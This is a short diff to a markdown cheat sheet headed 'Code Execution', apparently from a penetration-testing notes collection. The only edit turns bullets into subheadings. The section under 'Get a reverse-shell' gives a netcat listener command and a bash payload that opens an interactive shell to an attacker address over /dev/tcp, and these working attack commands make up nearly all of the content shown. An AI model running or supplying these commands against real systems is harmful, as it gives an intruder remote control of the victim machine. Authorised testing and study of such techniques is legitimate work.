@@ -1,12 +1,12 @@
 # Code Execution
 
 ## Get a reverse-shell
-- Attacker Listening
+### Attacker Listening
 ```cmd
 nc -vv -l -p 8080
 ```
 
-- Payloads
+### Payloads
   - BASH
 ```BASH
 bash -i >& /dev/tcp/10.20.14.203/8080 0>&1
